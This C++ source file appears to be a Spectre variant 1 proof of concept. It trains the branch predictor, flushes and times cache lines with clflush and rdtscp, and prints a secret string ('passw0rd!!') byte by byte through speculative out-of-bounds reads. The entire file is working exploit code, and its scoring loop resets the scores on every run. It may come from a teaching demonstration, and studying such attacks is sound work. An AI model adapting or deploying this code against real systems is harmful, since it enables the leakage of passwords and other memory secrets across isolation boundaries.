#include <array>
#include <chrono>
#include <algorithm>
#include <numeric>
#include <iostream>
#include <string_view>
#include <x86intrin.h>
#include <tuple>
#include <string.h>
#include <stdlib.h>
using namespace std;

#define STEP_SIZE 2048
int branch_predictor_train_iterations = 20;

static constexpr std::string_view text_table[] = {"IIT Delhi", "WSS22", "passw0rd!!"};

static void force_read(uint8_t* p) { asm volatile("" : : "r"(*p) : "memory"); }

static int64_t read_tsc()
{
  unsigned int dummy;
  return __rdtscp(&dummy); 
}

static int
get_winner(int const* arr, size_t n)
{
  int ret = 0;
  for (int i = 0; i < n; i++) {
    if (arr[i] > arr[ret]) {
      ret = i;
    }
  }
  return ret;
}

static char
infer_byte(string_view const& text, int index)
{
  static unsigned char timing_array[256 * STEP_SIZE];
  memset(timing_array, 1, sizeof timing_array);

  char const* data = text.begin();
  int *text_size_in_heap = new int(text.size());

  int64_t latencies[256];
  int scores[256];

  for (int run = 0; run < 1000; run++) {
    for (int i = 0; i < 256; i++) {
      _mm_clflush(&timing_array[i * STEP_SIZE]);
    }
    int safe_index = (run % text.size());

    //warm the cache for data[index]
    for (int i = 0; i < 500; i++) {
      _mm_clflush(text_size_in_heap);
      for (volatile int z = 0; z < 1000; z++);
      int local_index = ((i + 1) % branch_predictor_train_iterations) ? safe_index : index;
      if (local_index < *text_size_in_heap) {
        force_read(&timing_array[data[index] * STEP_SIZE]);
      }
    }
    for (int i = 0; i < 256; i++) {
      int r = (97 * i) % 256;
      int64_t start = read_tsc();
      force_read(&timing_array[r*STEP_SIZE]);
      latencies[r] = read_tsc() - start;
    }
    int64_t sum_latencies = 0;
    for (int i = 0; i < 256; i++) {
      sum_latencies += latencies[i];
    }
    int64_t avg_latency = sum_latencies / 256;
    memset(scores, 0, sizeof scores);
    for (int i = 0; i < 256; i++) {
      if (latencies[i] < (avg_latency * 3/4)) {
        scores[i]++;
      }
    }
  }
  return get_winner(scores, 256);
}

int main(int argc, char** argv)
{
  if (argc > 2) {
    printf("Usage: spectre [branch_predictor_train_iterations]\n");
    return 1;
  }
  if (argc == 2) {
    branch_predictor_train_iterations = atoi(argv[1]);
  }

  srand(17);
  for (int i = text_table[2].begin() - text_table[1].begin();; i++) {
    char c = (char)infer_byte(text_table[1], i);
    //printf("%c[%hhx]\n", c, c);
    printf("%c", c);
    fflush(stdout);
    if (c == '\0') {
      break;
    }
  }
  return 0;
}
